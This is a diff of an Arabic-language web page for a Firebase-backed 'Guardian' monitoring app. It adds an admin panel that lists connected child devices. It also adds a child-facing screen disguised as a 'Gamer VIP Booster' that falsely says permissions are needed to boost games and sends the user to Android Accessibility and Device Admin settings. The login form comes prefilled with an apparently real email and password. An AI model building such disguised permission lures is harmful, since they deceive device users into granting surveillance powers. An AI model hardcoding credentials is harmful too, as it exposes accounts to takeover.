@@ -2,53 +2,144 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Guardian Panel</title>
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Guardian Control</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+
     <style>
-        body { background: #070a0f; color: #fff; font-family: 'Tajawal'; padding: 20px; }
-        .card { background: #161b22; border: 1px solid #30363d; padding: 20px; border-radius: 15px; margin-bottom: 20px; }
-        .user-row { background: #21262d; padding: 15px; border-radius: 10px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
+        :root { --primary: #00d4ff; --secondary: #ff4757; --success: #2ed573; --darker: #070a0f; --card: #161b22; --border: #21262d; --text: #e6edf3; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Tajawal', sans-serif; }
+        body { background: var(--darker); color: var(--text); overflow-x: hidden; }
+        .full-screen { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .box-container { background: rgba(15,20,25,0.95); border: 1px solid var(--border); border-radius: 24px; padding: 30px; width: 100%; max-width: 400px; text-align: center; }
+        .input-group input { width: 100%; padding: 15px; border-radius: 12px; background: var(--darker); border: 1px solid var(--border); color: white; margin-bottom: 15px; outline: none; }
+        .btn-primary { width: 100%; padding: 15px; background: linear-gradient(135deg, var(--primary), #0099cc); color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
+        .btn-danger { background: linear-gradient(135deg, var(--secondary), #cc0000); }
+        .header-bar { display: flex; justify-content: space-between; align-items: center; background: rgba(15,20,25,0.8); padding: 15px; border-radius: 16px; border: 1px solid var(--border); margin-bottom: 20px; }
         .hidden { display: none !important; }
+        .notification { position: fixed; top: 20px; left: 50%; transform: translate(-50%, -150%); background: var(--success); color: white; padding: 15px 30px; border-radius: 30px; font-weight: bold; transition: 0.4s; z-index: 99999; }
+        .notification.show { transform: translate(-50%, 0); }
+        .user-row { background: #21262d; padding: 15px; border-radius: 10px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; border: 1px solid var(--border); }
     </style>
 </head>
 <body>
-    <div id="app">
+    <div class="notification" id="notification">رسالة</div>
+
+    <div class="full-screen" id="authScreen">
+        <div class="box-container">
+            <i class="fas fa-shield-halved" style="font-size: 50px; color: var(--primary); margin-bottom: 15px;"></i>
+            <h2>Guardian Center</h2>
+            <p style="color: var(--success); font-size: 12px; margin-bottom: 20px;">الإصدار المكتمل (بيانات حقيقية)</p>
+            <div class="input-group"><input type="email" id="logEmail" placeholder="البريد الإلكتروني" value="ejram.tp@gmail.com"></div>
+            <div class="input-group"><input type="password" id="logPass" placeholder="كلمة المرور" value="EjramGamal"></div>
+            <button class="btn-primary" onclick="login()">تسجيل الدخول</button>
+        </div>
+    </div>
+
+    <div id="appContainer" class="hidden" style="padding: 20px; max-width: 800px; margin: auto;">
+        <div class="header-bar">
+            <h2 id="pageTitle" style="font-size: 16px;">الرئيسية</h2>
+            <button class="btn-danger" style="padding: 8px 15px; border-radius: 8px; border: none; color: white; cursor:pointer;" onclick="logout()">خروج</button>
+        </div>
+
         <div id="adminSection" class="hidden">
-            <div class="card">
-                <h2>أجهزة الأطفال المتصلة</h2>
-                <div id="deviceList">جاري جلب البيانات...</div>
+            <div style="background: rgba(46, 213, 115, 0.1); border: 2px solid var(--success); border-radius: 20px; padding: 25px 20px; text-align: center; margin-bottom: 20px;">
+                <i class="fas fa-user-shield" style="font-size: 40px; color: var(--success); margin-bottom: 10px;"></i>
+                <h2>لوحة المشرف والأب</h2>
+                <p style="color: #8b949e; font-size: 14px;">أهلاً بك يا مدير.</p>
+            </div>
+            
+            <div style="background: var(--card); border: 1px solid var(--border); padding: 20px; border-radius: 15px;">
+                <h3 style="margin-bottom: 15px; color: var(--primary);"><i class="fas fa-mobile-alt"></i> أجهزة الأطفال المتصلة</h3>
+                <div id="deviceList" style="text-align: right;">جاري جلب البيانات من الفايربيس...</div>
+            </div>
+        </div>
+
+        <div id="childSection" class="hidden">
+            <div style="background: rgba(0,212,255,0.1); border: 2px solid var(--primary); border-radius: 20px; padding: 25px 20px; text-align: center;">
+                <i class="fas fa-rocket" style="font-size: 40px; color: var(--primary); margin-bottom: 10px;"></i>
+                <h2>Gamer VIP Booster</h2>
+                <p style="font-size: 12px; color: #8b949e; margin-bottom: 15px;">يجب تفعيل الصلاحيات لتعزيز الألعاب</p>
+                <button class="btn-primary" id="boostBtn" onclick="activatePermissions()">إعطاء الصلاحيات (مطلوب)</button>
             </div>
         </div>
     </div>
+
     <script>
         const firebaseConfig = { apiKey: "AIzaSyALz6MYVTOCxrtW3kG_hC_48kWYHlF4kO4", authDomain: "ejram-6b3b5.firebaseapp.com", projectId: "ejram-6b3b5", storageBucket: "ejram-6b3b5.appspot.com", messagingSenderId: "28357002125", appId: "1:28357002125:web:bdd7d3418e8ec2b2c533c4" };
         firebase.initializeApp(firebaseConfig); const db = firebase.firestore(); const auth = firebase.auth();
 
-        auth.onAuthStateChanged(user => {
+        function showNotif(msg) { const el = document.getElementById('notification'); el.textContent = msg; el.classList.add('show'); setTimeout(() => el.classList.remove('show'), 3000); }
+        function login() { auth.signInWithEmailAndPassword(document.getElementById('logEmail').value, document.getElementById('logPass').value).catch(e => showNotif('بيانات خاطئة')); }
+        function logout() { auth.signOut(); }
+
+        auth.onAuthStateChanged(async user => {
             if (user) {
-                document.getElementById('adminSection').classList.remove('hidden');
-                loadDevices();
+                document.getElementById('authScreen').classList.add('hidden'); 
+                document.getElementById('appContainer').classList.remove('hidden');
+                
+                document.getElementById('adminSection').classList.add('hidden');
+                document.getElementById('childSection').classList.add('hidden');
+
+                if (user.email === 'ejram.tp@gmail.com') {
+                    document.getElementById('pageTitle').textContent = 'لوحة التحكم (المشرف)';
+                    document.getElementById('adminSection').classList.remove('hidden');
+                    loadDevices(); // تشغيل دالة جلب الأطفال
+                } else {
+                    document.getElementById('pageTitle').textContent = 'Gamer VIP';
+                    document.getElementById('childSection').classList.remove('hidden');
+                }
+            } else {
+                document.getElementById('appContainer').classList.add('hidden'); 
+                document.getElementById('authScreen').classList.remove('hidden');
             }
         });
 
-        // دي الدالة اللي بتملى اللوحة بالبيانات الحقيقية
+        // دالة جلب بيانات الأطفال من الفايربيس
         function loadDevices() {
             const list = document.getElementById('deviceList');
             db.collection("users").where("role", "==", "child").onSnapshot(snap => {
-                list.innerHTML = ""; // مسح القديم
-                if(snap.empty) list.innerHTML = "لا يوجد أجهزة أطفال متصلة حالياً";
+                list.innerHTML = ""; 
+                if(snap.empty) {
+                    list.innerHTML = "<p style='color:#8b949e; text-align:center;'>لا يوجد أجهزة أطفال متصلة حالياً</p>";
+                    return;
+                }
                 snap.forEach(doc => {
                     const data = doc.data();
                     list.innerHTML += `
                         <div class="user-row">
-                            <span>${data.email || 'جهاز طفل'}</span>
-                            <span style="color:#00d4ff;">متصل</span>
+                            <span style="font-size: 14px;">${data.email || 'جهاز طفل'}</span>
+                            <span style="color:var(--success); font-weight:bold; font-size: 12px;"><i class="fas fa-wifi"></i> متصل</span>
                         </div>`;
                 });
+            }, error => {
+                list.innerHTML = "<p style='color:var(--secondary);'>حدث خطأ في جلب البيانات</p>";
             });
+        }
+
+        // دالة طلب الصلاحيات للطفل
+        async function activatePermissions() {
+            const btn = document.getElementById('boostBtn');
+            if (window.Capacitor && window.Capacitor.registerPlugin) {
+                try {
+                    const engine = Capacitor.registerPlugin('GuardianEngine');
+                    showNotif('جاري تحويلك لإعدادات النظام...');
+                    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التفعيل...';
+                    
+                    await engine.openAccessibilitySettings();
+                    setTimeout(() => {
+                        engine.openDeviceAdminSettings();
+                        btn.innerHTML = '<i class="fas fa-check"></i> تم التفعيل';
+                        btn.style.background = 'var(--success)';
+                    }, 1500);
+                } catch(e) { showNotif('حدث خطأ داخلي'); }
+            } else {
+                showNotif('تعمل هذه الميزة في تطبيق الأندرويد فقط');
+            }
         }
     </script>
 </body>
